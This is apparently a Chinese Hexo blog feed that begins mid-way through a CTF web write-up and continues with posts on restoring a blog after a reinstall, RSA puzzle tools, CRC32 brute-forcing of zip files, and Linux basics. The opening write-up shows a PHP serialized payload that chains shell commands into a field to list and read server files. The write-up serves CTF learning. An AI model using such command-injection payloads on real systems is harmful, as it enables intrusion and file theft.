class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; l\s &amp;&amp; index"</span>;    /</span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>得到一堆文件列表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class </span><br><span class="line">  class.php </span><br><span class="line">  class.php.bak </span><br><span class="line">  image </span><br><span class="line">  index.php </span><br><span class="line">  index.php.bak </span><br><span class="line">  waf.php</span><br></pre></td></tr></table></figure><p>用pwd命令查看当前所在目录为/app，再find一下，找出该目录下所有的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/app </span><br><span class="line">/app/class </span><br><span class="line">/app/class/win.php </span><br><span class="line">/app/class/flag.php </span><br><span class="line">/app/image </span><br><span class="line">/app/image/PUBG.jpg </span><br><span class="line">/app/index.php.bak </span><br><span class="line">/app/waf.php </span><br><span class="line">/app/class.php </span><br><span class="line">/app/class.php.bak </span><br><span class="line">/app/index.php</span><br></pre></td></tr></table></figure><p>最后发现应该在flag.php里面<br>于是最后改payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:45:&quot;/win.php &amp;&amp; sort /app/class/flag.php &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到flag<br><a href="http://imgchr.com/i/9olMPf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olMPf.png" alt="9olMPf.png"></a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>重装系统后快速恢复hexo博客(保留了原有的博客文件夹)</title>
      <link href="/2018/03/03/backup-blog-again/"/>
      <url>/2018/03/03/backup-blog-again/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本人刚假期结束回到宿舍。。发现自己的电脑外设全都没有了反应，重装驱动也不行，于是就只能重装系统了</p><p>重装系统后发现博客的环境又得重新配置，我就简单记录一下</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先我把git跟Node还有hexo重装了一遍，<br>因为重装系统有可能删除了配置文件包括环境变量里面的，没有配置 name 和 email 的话，git 是无法正常工作的。所以首先得重新配置name跟email<br>在git bash里面输入下面两行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name=<span class="string">"你的名字"</span></span><br><span class="line">git config --global user.email=<span class="string">"你的邮箱"</span></span><br></pre></td></tr></table></figure><p>记得要写<code>--global</code>我发现如果不写的话是没有用的。。。。<br>对了如果上面两条命令fail了的话，记得先用命令<code>git init</code>再输入上面两条命令</p><p>然后就是重新生成私匙并添加至git后测试链接<br>生成私钥：<code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code><br>接着按3个回车就好，中间你也可以输入密码，你随意，回车可以跳过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file <span class="keyword">in</span> <span class="built_in">which</span> to save the key (/c/Users/Mr.Yang/.ssh/id_rsa):</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved <span class="keyword">in</span> /c/Users/Mr.Yang/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> /c/Users/Mr.Yang/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:zA6wNJrFB6NcqS6eBog/AHlzQuvFjYpG759Yhh1lWGI xxxxxx@xxxxx.xxx(上面自己的邮箱)</span><br><span class="line">The key<span class="string">'s randomart image is:</span></span><br><span class="line"><span class="string">+---[RSA 2048]----+</span></span><br><span class="line"><span class="string">|    +E .         |</span></span><br><span class="line"><span class="string">| ..+oo+          |</span></span><br><span class="line"><span class="string">| oo+*+.o         |</span></span><br><span class="line"><span class="string">|o.*===+o         |</span></span><br><span class="line"><span class="string">|==+*... S        |</span></span><br><span class="line"><span class="string">|B.+.o .o         |</span></span><br><span class="line"><span class="string">|++o. +  .        |</span></span><br><span class="line"><span class="string">| +o.+ .          |</span></span><br><span class="line"><span class="string">|.  o.o           |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br></pre></td></tr></table></figure><p>.ssh目录下得到了两个文件：<code>id_rsa（私有秘钥）和id_rsa.pub（公有密钥）</code><br>一般都在C盘你自己的所在用户目录下的<code>./ssh</code>文件夹中<br><a href="https://imgchr.com/i/CgrHN8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgrHN8.md.png" alt="CgrHN8.md.png"></a></p><p>然后把id_rsa.pub里面的内容放到一个新的ssh的内容里面，标题自定义，以前的不要的ssh你也可以delete掉<br>下面是过程：<br>先在你的GitHub右上角你的用户那里找的Settings….<br><img src="https://s1.ax1x.com/2018/05/20/CgrO3Q.png" alt="CgrO3Q.png"><br>然后在左边找到SSH的这个东西<br><img src="https://s1.ax1x.com/2018/05/20/Cgrxun.png" alt="Cgrxun.png"><br>最后new一个ssh，记得把id_rsa.pub里面的全部内容放到里面，标题自定义，跟一开始设置博客的时候差不多<br><a href="https://imgchr.com/i/Cgs9EV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgs9EV.md.png" alt="Cgs9EV.md.png"></a><br>然后重新在git bash 下输入命令检测是否成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host <span class="string">'github.com (207.97.227.239)'</span> can<span class="string">'t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no)?  # 直接输入yes</span></span><br><span class="line"><span class="string">Hi cnfeat! You'</span>ve successfully authenticated, but GitHub does not provide shell access</span><br></pre></td></tr></table></figure><p>哈哈，然后又可以像以前一样开心的使用 <code>hexo g -d</code>了</p><p>参考博客：<a href="https://www.cnblogs.com/zhanglianbo/p/5648206.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhanglianbo/p/5648206.html</a></p>]]></content>
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>大致了解一下RSA以及出题套路</title>
      <link href="/2018/02/25/RSA-SimpleLearn/"/>
      <url>/2018/02/25/RSA-SimpleLearn/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  最近做的CTF题目遇到RSA加密总是不会，于是参考资料学习一番，小结自己的学习过程，怕自己某天又忘记了<br>RSA是属于现代密码学的范畴，现代密码学的终极目标是:发明永远无法破解的加密算法<br>而他们很多又是跟二进制相关，二进制加密的唯一算法  XOR<br>下面两个标准就很典型。。。<br>DES 数据加密标准<br>AES 高级加密标准<br>对于上面的东西一知半解。。什么轮子函数都没了解清楚，还有一些什么盒子之类的东西。。。emmm以后在深究吧</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>跟标题一样，我只是简单了解RSA算法，然后把自己得理解写出来，毕竟那些什么欧拉公式，什么高斯的数论，看也看一到两天，太费时间。。。</p><p><strong>RSA是一种非对称加密算法，它由 公钥（n/e），私钥(n/d)，明文M和密文C组成。</strong></p><h3 id="RSA的大致过程"><a href="#RSA的大致过程" class="headerlink" title="RSA的大致过程"></a>RSA的大致过程</h3><p><a href="https://imgchr.com/i/CgsFCF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgsFCF.md.png" alt="CgsFCF.md.png"></a></p><p>选取两个大素数生成n,p和q，n=p*q,这里的n目前大都是在1024位左右，难以破解，因为它越长，分解起来就越难<br>随机选取加密密钥e，保证e和(p-1)(q-1)互素</p><p>计算解密私钥 <code>e*d ≡ 1 mod (p-1)(q-1)</code></p><p>加密   <code>c=m^e mod n</code></p><p>解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m=c^d mod n</span><br></pre></td></tr></table></figure><p>这里的c指的是密文，m指的是明文<br>其中(n,e)为公钥，(n,d)为私钥</p><h3 id="介绍一个同余运算的概念"><a href="#介绍一个同余运算的概念" class="headerlink" title="介绍一个同余运算的概念"></a>介绍一个同余运算的概念</h3><p>两个整数a,b，它们除以整数M所得的余数相等：<code>a ≡ b(mod m)</code>，比如说5除3余数为2，11除3余数也为2，于是可写成<code>11 ≡ 5(mod 3)</code></p><p>然后就做了几个题目，发现嫌他们的套路就是不停的玩转这几个参数。。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">已知p、q、e求d</span><br><span class="line">已知p、q、e和密文 求明文</span><br><span class="line">已知n、e和密文 求明文</span><br><span class="line">已知公钥和密文 求明文</span><br></pre></td></tr></table></figure></p><h3 id="还有就是简单记录一下相关工具的用法"><a href="#还有就是简单记录一下相关工具的用法" class="headerlink" title="还有就是简单记录一下相关工具的用法"></a>还有就是简单记录一下相关工具的用法</h3><h4 id="RSAtool"><a href="#RSAtool" class="headerlink" title="RSAtool"></a>RSAtool</h4><p>这个还是比较方便的，但还是觉得脚本顺手<br><a href="https://imgchr.com/i/Cgsk34" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgsk34.md.png" alt="Cgsk34.md.png"></a></p><p>Keysize(Bits)：填写你N的位数<br>Public Exp.(E)：填写你的e的十进制值<br>Number Base：填写你下面N的进制（一般采用10进制）<br>Modulus(N)：填写N的十进制数（和Number Base填写的要对应）<br>然后点击左下角的Factor N<br>就会自动分解出P和Q<br>然后点击左下角的Calc. D<br>就会自动计算出D<br>然后点击左下角的Test<br>（这里好像有个Bug，要先加密一次，才能用解密功能）<br>然后把你的密文放在result里，点击decrypto<br>即可得到解密后的答案</p><h4 id="yafu"><a href="#yafu" class="headerlink" title="yafu"></a>yafu</h4><p>一个大数分解工具<br>用命令行进入打此目录下，命令如下，N是你输入的大数<br>yafu-x64.exe factor(N)<br><a href="https://imgchr.com/i/CgsZuR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgsZuR.md.png" alt="CgsZuR.md.png"></a></p><p>还有一个PARI。。。这好像也是一种语言。。一般是用来将大数16进制转10进制。。或者是判断N的位数使用<br><a href="https://imgchr.com/i/CgsHq1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgsHq1.md.png" alt="CgsHq1.md.png"></a><br>反正不理了，指令也很简单：<br>第一步:<code>输入数字</code><br>（当然，如果输入16进制，你要带上0x，他会底下自动给你显示10进制，十分方便）<br>第二步: <code>binary(x)</code><br>他就会帮你把这个大数分解成2进制<br>第三步: <code>length(x)</code><br>他可以帮你输出这个N的位数</p><h4 id="openssl"><a href="#openssl" class="headerlink" title="openssl"></a>openssl</h4><p>有时候遇到下面这种格式的,就会选择用openssl<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAQEDZxmNa1YU6VgTrdjyKkcX</span><br><span class="line">vHK+HqvZM9G4aUT9t1uO0jC+YtfRtp0iIJXBKMhvggEuyxFhkf2dAYptAvhNsnvF</span><br><span class="line">GiEwfchvS/dxxpHBQ+Wr5Um1vS1usaIf1icOfhtI/gYR+7LhsLNSTm9N6LTko0Xa</span><br><span class="line">RKE96CW3JgjbbHxKQLeCZubIe7/e9rSDgdScRQeli81Ht21ktFkIsVi9frxNrLCx</span><br><span class="line">z9bCwZV09A6y79Dp4Q3HAFytObyvUrnqw4czaNaQMcXnJGhKRPBo79HT3Altm11k</span><br><span class="line">EeWL3uQ+RrmaDQSUudsoGVr5Aa/xMNSm4gPa0I2lf6fkAmKlutsqMj7aKLRGlqsw</span><br><span class="line">XQKCAQEA85Wdl44C658G3vPzNdj4r9dgmVHdrGC3FLbCKvD6kS8hCzQga9JKlgHH</span><br><span class="line">jfSgJ18Qf9OrVS2VBX65NOcb3c1wRcJLGFh7jI/PWt1MXYPwx3yU3JxQy+Q44rZ7</span><br><span class="line">r9MWM7aq8XgdkMOtbwPQN7MyGAGyNUbUg+Z+JgZ/eyI0fdvAwtWSzoFMv138zBQU</span><br><span class="line">N/FOCzmQ+IBh5fC65fAeP6cNsOlgXnz9V16cge/uxSnDP9kDeiD9is1ROsljd2gx</span><br><span class="line">PmP5g4rjURzdCporUW8hSMjUdaNgoGNZRJc57s0lGrtCsBRXPkOfL6RXNVeyVpn/</span><br><span class="line">wR5jHOjul1qG5+JyvPX3apNFA0j+Pw==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/02/25/9dsjJA.png" alt="9dsjJA.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in public.key -pubin -noout -text -modulus</span><br></pre></td></tr></table></figure></p><p>上面的public.key就是你所需要查看的文件名</p><p>然后使用密钥文件进行解密的话<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure></p><p>flag.enc是加密文件  private.pem是密钥  flag.dec解密文件</p><p>配合下面的Python脚本在linux下使用，记得在同一文件夹下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">keypair = RSA.generate(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">keypair.p =  <span class="number">258631601377848992211685134376492365269</span></span><br><span class="line">keypair.q = <span class="number">286924040788547268861394901519826758027</span></span><br><span class="line">keypair.e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">keypair.n = keypair.p * keypair.q</span><br><span class="line">Qn = long((keypair.p<span class="number">-1</span>) * (keypair.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (<span class="keyword">True</span>):</span><br><span class="line">    x = (Qn * i ) + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (x % keypair.e == <span class="number">0</span>):</span><br><span class="line">        keypair.d = x / keypair.e</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">private = open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(keypair.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>记得修改一下p q e</p><p>参考文章:<br><a href="http://www.freebuf.com/column/148185.html" target="_blank" rel="noopener">http://www.freebuf.com/column/148185.html</a><br><a href="http://skysec.top/2017/07/25/RSA常用工具/" target="_blank" rel="noopener">http://skysec.top/2017/07/25/RSA常用工具/</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RSA </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CRC32爆破小结</title>
      <link href="/2018/02/24/CRC32-Brute/"/>
      <url>/2018/02/24/CRC32-Brute/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在bugku遇到了一道隐写题，binwalk之后发现里面有很多个压缩包。。。。。。然后就无从下手，于是查看别人大佬的wp才发现是CRC32爆破，由于本人第一次遇到这种题目，就记录一下吧。。</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="CRC想必大家都知道，它的全称是循环冗余校验-Cyclic-Redundancy-Check-CRC-，用来校验文件是否出错但并不能用于自动纠错。。emmmm，计组上课好像讲过，老师让我们回去自己学，记得当时只是初略了解了一下，就是在后面加上一小段冗余位去检测，详细规则谷歌一下吧。。。。"><a href="#CRC想必大家都知道，它的全称是循环冗余校验-Cyclic-Redundancy-Check-CRC-，用来校验文件是否出错但并不能用于自动纠错。。emmmm，计组上课好像讲过，老师让我们回去自己学，记得当时只是初略了解了一下，就是在后面加上一小段冗余位去检测，详细规则谷歌一下吧。。。。" class="headerlink" title="CRC想必大家都知道，它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。。emmmm，计组上课好像讲过，老师让我们回去自己学，记得当时只是初略了解了一下，就是在后面加上一小段冗余位去检测，详细规则谷歌一下吧。。。。"></a>CRC想必大家都知道，它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。。emmmm，计组上课好像讲过，老师让我们回去自己学，记得当时只是初略了解了一下，就是在后面加上一小段冗余位去检测，详细规则谷歌一下吧。。。。</h4><p><a href="https://imgchr.com/i/CgsjPO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgsjPO.md.png" alt="CgsjPO.md.png"></a></p><h4 id="这里我以破解四位CRC的压缩包为例。。。。写一个理解之后的脚本"><a href="#这里我以破解四位CRC的压缩包为例。。。。写一个理解之后的脚本" class="headerlink" title="这里我以破解四位CRC的压缩包为例。。。。写一个理解之后的脚本"></a>这里我以破解四位CRC的压缩包为例。。。。写一个理解之后的脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line">dic=string.printable     <span class="comment">#各种打印字符</span></span><br><span class="line"></span><br><span class="line">crc = <span class="string">'''你的输入 '''</span>     <span class="comment"># 记得要以0x开头</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">s=i+j+p+q</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>要<strong>特别注意</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (binascii.crc32(str(i)) &amp; 0xffffffff) == crc:</span><br></pre></td></tr></table></figure><p>在 Python 2.x 的版本中，binascii.crc32 所计算出來的 CRC 值域为[-2^31, 2^31-1] 之间的有符号整数，为了要与一般CRC 结果作比对，需要将其转为无符号整数，所以加上&amp; 0xffffffff来进行转换。如果是 Python 3.x 的版本，其计算结果为 [0, 2^32-1] 间的无符号整数，因此不需额外加上&amp; 0xffffffff 。</p><p>下面就bugku那道多个压缩包为例，上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="comment"># def tansnum(s):</span></span><br><span class="line"><span class="comment">#     return int(s, 16)  转十六进制</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic=string.printable</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">s=i+j+p+q</span><br><span class="line"><span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"><span class="comment">#return </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcrc32</span><span class="params">()</span>:</span></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">file = <span class="string">'out'</span> + str(b) + <span class="string">'.zip'</span></span><br><span class="line">f = zipfile.ZipFile(file,<span class="string">'r'</span>)</span><br><span class="line">GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">crc = GetCrc.CRC</span><br><span class="line">l.append(hex(crc))</span><br><span class="line"><span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__  == <span class="string">"__main__"</span>:</span><br><span class="line"><span class="comment">#c = open('out.txt', 'w')</span></span><br><span class="line">l = getcrc32()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> l:</span><br><span class="line">   CrackCrc(i)</span><br><span class="line"><span class="comment">#c.close()</span></span><br></pre></td></tr></table></figure><p>如果上面的python操作zip文件还不太懂的话看看这个:(<a href="http://www.cnblogs.com/sun-haiyu/p/7082063.html，简单的来说就是用ZipFile读取文件，用getinfo函数获取信息。。。" target="_blank" rel="noopener">http://www.cnblogs.com/sun-haiyu/p/7082063.html，简单的来说就是用ZipFile读取文件，用getinfo函数获取信息。。。</a><br><strong>特别注意</strong>，上面的脚本跑这一题十分慢，我跑了差不多40分钟都没跑完。。。效率极低，所以啊有空我还是学习一下多线程该怎么跑。。。</p><h4 id="另外还有一款很好用的6位的CRC32爆破"><a href="#另外还有一款很好用的6位的CRC32爆破" class="headerlink" title="另外还有一款很好用的6位的CRC32爆破"></a>另外还有一款很好用的6位的CRC32爆破</h4><p>附上神器：(<a href="http://github.com/theonlypwner/crc32" target="_blank" rel="noopener">http://github.com/theonlypwner/crc32</a><br>具体使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crc32.py reverse 你的crc32密文</span><br></pre></td></tr></table></figure><p>这里的密文记得加上0x变成16进制。。。即可非常迅速的爆破出对应的数据，举个例子</p><p><a href="https://imgchr.com/i/CgszxH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/CgszxH.md.png" alt="CgszxH.md.png"></a><br>这里就有点哈西冲突的体现了^_^</p><p>这个CRC32爆破一旦超过六位，我觉得毫无疑义，毕竟密码超过7位你爆破需要花很长的时间，对于这个也一样。。。。<br>这就从另外一个角度诠释了什么叫无法破解的密码(#^.^#)，虽然这一个东西也会出现类似哈希冲突的现象。。。。。。</p><p>参考文章<br><a href="http://www.360zhijia.com/360anquanke/217342.html" target="_blank" rel="noopener">http://www.360zhijia.com/360anquanke/217342.html</a><br><a href="http://skysec.top/2017/06/19/CRC爆破总结/" target="_blank" rel="noopener">http://skysec.top/2017/06/19/CRC爆破总结/</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> CRC32爆破 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>熟悉Linux命令~~~</title>
      <link href="/2018/02/23/Linux-learn/"/>
      <url>/2018/02/23/Linux-learn/</url>
      <content type="html"><![CDATA[<p>发现自己对Linux命令不太熟悉还是学习一下吧<br><a id="more"></a></p><h1 id="分区：把大硬盘分为小的逻辑分区"><a href="#分区：把大硬盘分为小的逻辑分区" class="headerlink" title="分区：把大硬盘分为小的逻辑分区"></a>分区：把大硬盘分为小的逻辑分区</h1><h2 id="系统分区"><a href="#系统分区" class="headerlink" title="系统分区"></a>系统分区</h2><ol><li>主分区 最多只能有四个</li><li>扩展分区 最多只能有一个，也就是说主分区家扩展分区最多只能有四个，不能写入数据，只能包含逻辑分区</li><li>逻辑分区</li></ol><p>格式化 为了写入文件系统….在linux中任何内容都是文件</p><p>硬件设备文件名 /dev/…    第一个’/‘代表的是根目录，dev目录下保存的都是硬件设备文件名 </p><p>根目录下的bin和sbin，usr目录下的bin和sbin这四个目录都是用来保存系统命令的<br>/etc/ 目录下一般都是配置文件<br>/lib/  目录下一般都是Linux的函数库<br>proc和sys 目录不应该 操作，这两个目录保存的是内存德过载点<br>所以不应该在Linux下任何一个文件夹内乱写东西，可以在家目录root或home，以及temp目录下随便放内容</p><h1 id="挂载：给每个分区分配挂载点–-gt-相当于Windows下的盘符"><a href="#挂载：给每个分区分配挂载点–-gt-相当于Windows下的盘符" class="headerlink" title="挂载：给每个分区分配挂载点–&gt;相当于Windows下的盘符"></a>挂载：给每个分区分配挂载点–&gt;相当于Windows下的盘符</h1><h2 id="必须要有的分区"><a href="#必须要有的分区" class="headerlink" title="必须要有的分区"></a>必须要有的分区</h2><ol><li>‘/‘根分区</li><li>swap分区(交换分区，内存2倍，不超过2GB，类似与虚拟内存，内存不够用，可以用里面的当内存使用)</li><li>推荐分区<br>/boot  (启动分区，200MB)  这个可以不弄，到时有时候误删的时候，会导致启动不了</li></ol><h1 id="安装日志"><a 